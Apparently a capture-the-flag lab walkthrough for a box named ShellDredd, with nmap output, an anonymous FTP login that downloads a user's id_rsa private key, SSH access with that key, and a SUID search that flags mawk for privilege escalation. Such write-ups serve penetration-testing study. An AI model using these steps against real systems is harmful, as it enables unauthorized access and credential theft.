# Export
```bash
export IP="192.168.135.130"
export URL="http://192.168.135.130:80/FUZZ"
```

<hr>

# Privilege Escalation
```bash
hannah@ShellDredd:~$ find / -perm -u=s -ls 2>/dev/null   
...
     2242    120 -rwsr-sr-x   1 root     root         121976 Mar 23  2012 /usr/bin/mawk
...
```

<hr>

# Nmap
```bash
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:            
|   STAT:                            
| FTP server status:                 
|      Connected to ::ffff:192.168.49.135
|      Logged in as ftp              
|      TYPE: ASCII                   
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text     
|      Data connections will be plain text                                                                                                                                                    
|      At session startup, client count was 2                                                  
|      vsFTPd 3.0.3 - secure, fast, stable                                                     
|_End of status
61000/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiOZxbr74TmNuWOBDmPInK6nZnRGfOMtZMJDBErXIPCZR9kdZDqJbkdRlnP8QLGuTl/t8qPgP863Rl1yfJLSv995PQ+oUZTSa21cGulVCtFFCKedJJJF9p2cAyYzjeA9qg1Ja7dOPtyPsSCplYzZcI
LwXZ52mg1k8VH2HUZ7DO0wMBYWONhkXWRR49gMN+IKge3DXNrfyHtnjMVWTwEtfqjFd+D70qi7UusZyfP2MogDX7LgRWC9RmvS6o8KxYW4psLWDB2dp/Nf3FitenY0UMPKkHrxxjeqfYZhFwENmHAsxzrHJo1acSrNMUbTdWuLzcLHQgMIYMUlmGvDkg31
c/
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNXNPAPJkUYF4+uu955+0RpMZKriG9olCwtkPB3j5XbiiB+B7WEVv331ittcLxibSBWqV2OO328ThebB2YF9qvI=
|   256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5tk066endR9DMYxXzxhixx6c8cQ0HjGvYbtL8Lgv91
```

<hr>

# FTP
+ File share

```bash
$ ftp  192.168.135.130 
Connected to 192.168.135.130.
220 (vsFTPd 3.0.3)
Name (192.168.135.130:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
226 Transfer complete.
1823 bytes received in 0.00 secs (20.2157 MB/s)
```

<hr>

# SSH

```bash
$ ssh -i id_rsa hannah@192.168.135.130  -p 61000
...
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ id
uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```
